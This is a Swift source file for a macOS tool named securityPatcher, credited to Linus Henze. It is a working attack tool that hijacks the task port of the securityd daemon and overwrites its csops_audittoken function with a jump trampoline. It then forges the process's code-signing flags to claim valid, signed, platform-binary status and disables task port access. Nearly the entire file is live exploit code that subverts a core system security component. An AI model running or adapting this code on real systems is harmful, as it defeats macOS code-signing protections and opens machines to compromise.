//
//  main.swift
//  securityPatcher
//
//  Created by Linus Henze.
//  Copyright © 2019 Linus Henze. All rights reserved.
//

import Foundation

typealias voidFunc = @convention(c) () -> Void

if CommandLine.argc != 2 {
    print("Usage: securityPatcher <securityd PID>")
    exit(-1)
}

do {
    guard let pid = pid_t.init(CommandLine.arguments[1]) else {
        print("Invalid PID!")
        exit(-1)
    }
    
    let tp = try getTaskPort(pid: pid)
    
    task_suspend(tp)
    defer {
        task_resume(tp)
    }
    
    // No, that's not a hack ;)
    let my_csops: voidFunc = csops
    let my_csops_audittoken: voidFunc = csops_audittoken
    let csops_addr = UInt64(UInt(bitPattern: unsafeBitCast(my_csops, to: UnsafeRawPointer.self)))
    let csops_audittoken_addr = UInt64(UInt(bitPattern: unsafeBitCast(my_csops_audittoken, to: UnsafeRawPointer.self)))
    
    // Have fun ;)
    // There's probably a better solution than this...
    let trampoline: [UInt8] = [0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0xFF, 0xE0]
    trampoline.withUnsafeBufferPointer({ (ptr) in
        ptr.baseAddress!.advanced(by: 2).withMemoryRebound(to: UInt64.self, capacity: 1, { (ptr) in
            UnsafeMutableBufferPointer(start: UnsafeMutablePointer(mutating: ptr), count: 1)[0] = csops_addr
        })
    })
    
    var kr = mach_vm_protect(tp, csops_audittoken_addr, mach_vm_size_t(trampoline.count), 0, VM_PROT_READ | VM_PROT_WRITE)
    if kr != KERN_SUCCESS {
        print("mach_vm_protect (1) failed!")
        exit(-1)
    }
    
    kr = mach_vm_write(tp, csops_audittoken_addr, trampoline.withUnsafeBufferPointer({ (ptr) in
        return UInt(bitPattern: ptr.baseAddress!)
    }), mach_msg_type_number_t(trampoline.count))
    if kr != KERN_SUCCESS {
        print("mach_vm_write failed!")
        exit(-1)
    }
    
    kr = mach_vm_protect(tp, csops_audittoken_addr, mach_vm_size_t(trampoline.count), 0, VM_PROT_READ | VM_PROT_EXECUTE)
    if kr != KERN_SUCCESS {
        print("mach_vm_protect (2) failed!")
        exit(-1)
    }
    
    try setCSFlags(pid: pid, flags: CS_VALID | CS_SIGNED | CS_PLATFORM_BINARY)
    
    try disableTaskPortAccess()
} catch let e {
    print(e)
    exit(-1)
}

print("Patching succeded!")

exit(0)
